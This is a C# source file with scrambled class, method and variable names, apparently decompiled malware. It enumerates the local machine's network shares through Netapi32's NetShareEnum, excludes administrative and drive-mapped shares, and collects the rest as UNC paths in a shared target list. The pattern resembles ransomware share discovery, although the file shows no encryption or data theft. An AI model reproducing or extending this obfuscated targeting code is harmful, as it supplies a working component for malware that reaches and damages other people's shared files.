using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace vQzMGKHeycFziMq;

public class XTKLZTGcprgcA
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ZYvYfQDEPUCk
	{
		public string pTSqwTUGuOAr;

		public uint gKCJcYeMpizJ;

		public string lNhcppXVsNa;

		public ZYvYfQDEPUCk(string sharename, uint sharetype, string remark)
		{
			pTSqwTUGuOAr = sharename;
			gKCJcYeMpizJ = sharetype;
			lNhcppXVsNa = remark;
		}

		public override string ToString()
		{
			return pTSqwTUGuOAr;
		}
	}

	private enum WsxSjOcniaG : uint
	{
		JgNObGGBBJ = 0u,
		OWCGWzTisrnB = 2100u,
		aoKZCDhNvmRV = 2116u,
		FuEdBdMPgWkP = 2118u,
		wnApVqenWGHVw = 2123u
	}

	private enum iZYtZRmUYZrV : uint
	{
		cDhHOmKQUDj = 0u,
		JXUdSsvdSLS = 1u,
		BhjhkFgOCyLf = 2u,
		xqnpnPdWjbfj = 3u,
		VYdvQptrobLQzFxb = 2147483648u
	}

	private const uint DEohSILvLUtv = uint.MaxValue;

	private const int JgNObGGBBJ = 0;

	public ZYvYfQDEPUCk[] KNwWqNHpvdSJ(string lgeSkjpbsoqE)
	{
		List<ZYvYfQDEPUCk> list = new List<ZYvYfQDEPUCk>();
		int sMXlhQqAaxgoNdX = 0;
		int TUmVcayMYIvEMd = 0;
		int kNqVDNtnvJkj = 0;
		int num = Marshal.SizeOf(typeof(ZYvYfQDEPUCk));
		IntPtr fKZOjJBMKVElaJ = IntPtr.Zero;
		StringBuilder kNXfVjRHqklhwDQx = new StringBuilder(lgeSkjpbsoqE);
		int num2 = NetShareEnum(kNXfVjRHqklhwDQx, 1, ref fKZOjJBMKVElaJ, uint.MaxValue, ref sMXlhQqAaxgoNdX, ref TUmVcayMYIvEMd, ref kNqVDNtnvJkj);
		if (num2 == 0)
		{
			IntPtr ptr = fKZOjJBMKVElaJ;
			for (int i = 0; i < sMXlhQqAaxgoNdX; i++)
			{
				ZYvYfQDEPUCk item = (ZYvYfQDEPUCk)Marshal.PtrToStructure(ptr, typeof(ZYvYfQDEPUCk));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(fKZOjJBMKVElaJ);
			return list.ToArray();
		}
		list.Add(new ZYvYfQDEPUCk("ERROR=" + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr XcPfqeXwvMJf);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder kNXfVjRHqklhwDQx, int LRVHdMIxTPLzb, ref IntPtr fKZOjJBMKVElaJ, uint vopDVZSybdzkN, ref int sMXlhQqAaxgoNdX, ref int TUmVcayMYIvEMd, ref int kNqVDNtnvJkj);

	public static void agWAIMteLnZT()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			ZYvYfQDEPUCk[] array = new XTKLZTGcprgcA().KNwWqNHpvdSJ(Environment.MachineName);
			ZYvYfQDEPUCk[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				ZYvYfQDEPUCk zYvYfQDEPUCk = array2[i];
				if (zYvYfQDEPUCk.ToString().Contains("ADMIN$") || zYvYfQDEPUCk.ToString().Contains("print$") || zYvYfQDEPUCk.ToString().Contains("User") || zYvYfQDEPUCk.ToString().Contains("IPC$") || logicalDrives.Contains(zYvYfQDEPUCk.ToString().Replace("$", ":\\")))
				{
					continue;
				}
				if (!yzZnBHwSsJOOcf.lZNmNTLNdP.Contains("\\\\" + Environment.MachineName + "\\" + zYvYfQDEPUCk))
				{
					yzZnBHwSsJOOcf.lZNmNTLNdP.Add("\\\\" + Environment.MachineName + "\\" + zYvYfQDEPUCk);
				}
				if (yzZnBHwSsJOOcf.MFBaFacYIYTeS)
				{
					try
					{
						Console.WriteLine("Share Added: {0}", "\\\\" + Environment.MachineName + "\\" + zYvYfQDEPUCk);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (yzZnBHwSsJOOcf.dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(yzZnBHwSsJOOcf.HXSuIBiFjcFlYv, "Error while enumerating shares: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
